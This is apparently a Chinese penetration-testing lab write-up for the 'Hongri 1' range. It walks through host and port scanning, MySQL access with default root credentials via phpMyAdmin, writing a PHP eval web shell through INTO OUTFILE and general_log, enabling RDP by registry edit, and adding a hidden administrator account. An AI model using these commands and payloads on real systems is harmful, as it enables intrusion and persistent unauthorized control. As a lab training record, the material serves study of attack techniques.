# 红日1靶场(一)

搭建环境过程省略

拓扑图
ip

dc 192.168.52.141

成员 192.168.52.138

web 192.168.72.4 192.168.52.143



### 信息收集

2.1扫描主机

```
netdiscover
```



![image-20200812155453582](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200812155453582.png)

2.2探测端口

```
nmap -sC -sV -Pn -p 1-65525 192.168.72.4          //-sC根据端口识别服务 -sV版本探测 -Pn不检测主机存活 -p扫描指定端口
```

![image-20200812155928191](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200812155928191.png)

2.3打开发现一个php探针模块 滑到最下面 发现可以连接mysql数据库 默认密码 root root

另外还有一个,也可以尝试getshell

http://192.168.72.4/yxcms/index.php?r=admin/index/index

![image-20200812160516081](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200812160516081.png)

![image-20200812160756335](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200812160756335.png)

![image-20200812160733487](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200812160733487.png)

2.4利用phpadmin getshell 有两种方法into outfile 和 利用日志文件写入

第一种 利用条件 需要知道网站绝对路径 和root权限 [其实方法是对的,鉴于mysql的新特性而言等会补充]

```sql
select  '<?php eval($_POST[cmd]); ?>'  into outfile  'C:/phpStudy/WWWshell.php';
```

提示这个

![image-20200813083217060](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200813083217060.png)

第二种利用mysql日志写入

```mysql
#查看日志状态
show variables  like  '%general%';
#这里解释一下,当开启general时,所执行的sql语句就会生成对应的文件中
SET GLOBAL general_log='on'
SET GLOBAL general_log_file='C:/phpStudy/www/233.php'
SELECT '<?php eval($_POST["cmd"]);?>'
```

![img](https://mmbiz.qpic.cn/mmbiz_png/ddqrZtAEBOiaW4QMLSzMxVTk7RcjliaATzpOFVmVia9x0kf4tVjNoIic35OxTicDgXmNOhR7I992B4eRqRQutw9IjkQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

**![image-20200813100723299](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200813100723299.png)**

2.5这里我们已经getshell并连接上了.开始一波内网信息收集

![image-20200813102958077](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200813102958077.png)

# 内网渗透

3.1尝试远程登录

查看当前用户权限,如果渗透进去发现是Windows系统的话,首先尝试连接他的远程桌面,所以再看一下3389端口开放情况

![image-20200813103313458](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200813103313458.png)

```shell
#运行下面的命令,有回显说明打开的,没有回显说明关闭的
netstat -an | find "3389"
#运行下面的命令,打开3389端口,八个0是打开 八个一是关闭
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

```

3.2添加一条用户,尝试利用3389远程登录--发现连接不上,估计和防火墙,有关系,可能有白名单也说不定

```powershell
net user test 1234.com /add
net localgroup administrators test /add
net user test
```

![image-20200813104338630](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200813104338630.png)

![image-20200813104945055](C:\Users\18532\AppData\Roaming\Typora\typora-user-images\image-20200813104945055.png)

```


```

